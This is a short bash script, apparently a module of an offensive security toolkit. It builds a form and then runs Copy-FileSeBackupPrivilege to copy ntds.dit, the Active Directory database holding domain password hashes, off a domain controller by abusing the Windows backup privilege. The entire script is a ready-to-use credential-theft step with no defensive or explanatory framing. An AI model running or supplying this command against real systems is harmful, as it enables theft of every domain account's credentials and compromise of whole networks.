#!/bin/bash

: '
copy file with Copy-FileSeBackupPrivilege
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
ORIGINAL_FILE_LOCATION_FIELD=$(form_item  "original file location" "original_file_location" "E:\Windows\NTDS\ntds.dit")
TO_FILE_LOCATION_FIELD=$(form_item  "to file location" "to_file_location" ".\ntds.dit")

# Generate GUI form
generate_form "${ORIGINAL_FILE_LOCATION_FIELD}" "${TO_FILE_LOCATION_FIELD}"

ORIGINAL_FILE_LOCATION=${form_data["original_file_location"]}
TO_FILE_LOCATION=${form_data["to_file_location"]}

execute_command "Copy-FileSeBackupPrivilege ${ORIGINAL_FILE_LOCATION} ${TO_FILE_LOCATION}"
create_new_line
sleep 3
